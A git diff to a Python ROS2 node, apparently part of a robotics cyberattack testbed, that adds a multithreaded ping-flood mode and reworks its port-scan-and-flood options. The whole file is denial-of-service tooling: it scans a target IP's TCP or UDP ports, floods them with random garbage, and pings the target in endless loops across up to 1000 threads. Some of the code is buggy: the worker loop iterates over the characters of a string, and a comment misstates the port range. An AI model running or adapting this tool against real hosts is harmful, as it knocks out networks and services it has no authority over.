@@ -6,15 +6,17 @@ from rcl_interfaces.srv import GetParameters
 from ros2node.api import get_node_names
 from roboticpark_cyberattacks.dosattack_scan import scan_tcp_ports, scan_udp_ports
 import random, socket
+from ping3 import ping
 import concurrent.futures
 
 class dosnode(Node):
     def __init__(self):
         super().__init__("dosnode")
         self.declare_parameter('dos_ip_objective', "Unset")
-        self.declare_parameter('dos_objective', "Unset")
+        self.declare_parameter('dos_node_objective', "Unset")
         self.declare_parameter('dos_type', 'Unset')
-        self.declare_parameter('dos_repetitions', '0')
+        self.declare_parameter('dos_protocol', 'tcp')
+        self.declare_parameter('dos_ping_workers', '1000')
 
 def printargs(node):
     """Prints every param present in the node and its values
@@ -32,7 +34,7 @@ def printargs(node):
         node.get_logger().info(f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')
 
 def checkService(node):
-    objectiveParam = node.get_parameter('dos_objective')._value
+    objectiveParam = node.get_parameter('dos_node_objective')._value
     client = node.create_client(GetParameters, f'/{objectiveParam}/get_parameters')
     if not client.wait_for_service(timeout_sec=5.0):
         node.get_logger().info(f'Not able to connect that node {objectiveParam}')
@@ -71,32 +73,56 @@ def dosSendRandomGarbageAuxTCP(ip,node,port,socketObject):
         except (socket.error, BrokenPipeError) as e:
             print(f"Error: {e}. Reconnecting...")
 
+def dosSendPing(ipdest,workers):
+    futures = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=int(workers)) as executor:
+        for _ in workers:
+            futures.append(executor.submit(dosSendPingAux,ip=ipdest))
+
+def dosSendPingAux(ip):
+    while True:
+        try:
+            ping(ip)
+        except Exception as e:
+            print(f"Error: {e}")
 
 def main():
     rclpy.init()
     mydosnode = dosnode()
     printargs(mydosnode)
 
-
+    # Obtain values passed by parameters.
     ipobjectiveParam = mydosnode.get_parameter('dos_ip_objective')._value
     dostype = mydosnode.get_parameter('dos_type')._value
+    dosprotocol = mydosnode.get_parameter('dos_protocol')._value
+    dospingworkers = mydosnode.get_parameter('dos_ping_workers')._value
     portrange = range(1, 65535)  # Escanea los puertos del 1 al 1024
 
     if ipobjectiveParam == 'Unset':
         checkService(mydosnode)
         mydosnode.get_logger().info(f'We try to fill any of the topics:  {dostype} was chosen')
+
+
+
     else:
         mydosnode.get_logger().info(f'Regular dos attack, we can choose between ping and random garbage:  {dostype} was chosen')
 
         if dostype == 'garbage':
-            print('tcports')
-            dosSendRandomGarbageTCP(ipobjectiveParam,mydosnode,scan_tcp_ports(ipobjectiveParam,portrange),socket.SOCK_STREAM)
-            if ipobjectiveParam != '127.0.0.1':
-                print('udpports')
-                dosSendRandomGarbageUDP(ipobjectiveParam,mydosnode,scan_udp_ports(ipobjectiveParam,portrange),socket.SOCK_DGRAM)
+            if dosprotocol == 'tcp':
+                print('tcports')
+                dosSendRandomGarbageTCP(ipobjectiveParam,mydosnode,scan_tcp_ports(ipobjectiveParam,portrange),socket.SOCK_STREAM)
+            else:
+                if ipobjectiveParam != '127.0.0.1':
+                    print('udpports')
+                    dosSendRandomGarbageUDP(ipobjectiveParam,mydosnode,scan_udp_ports(ipobjectiveParam,portrange),socket.SOCK_DGRAM)
         else:
             if dostype == 'bruteforce':
-                print('Bruteforcing')
+                print(f'Bruteforcing w {dospingworkers}')
+                try:
+                    dosSendPing(ipobjectiveParam,dospingworkers)
+                except Exception as e:
+                    print(f"Ping Error:{e}")
+
 
     
     # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter, 
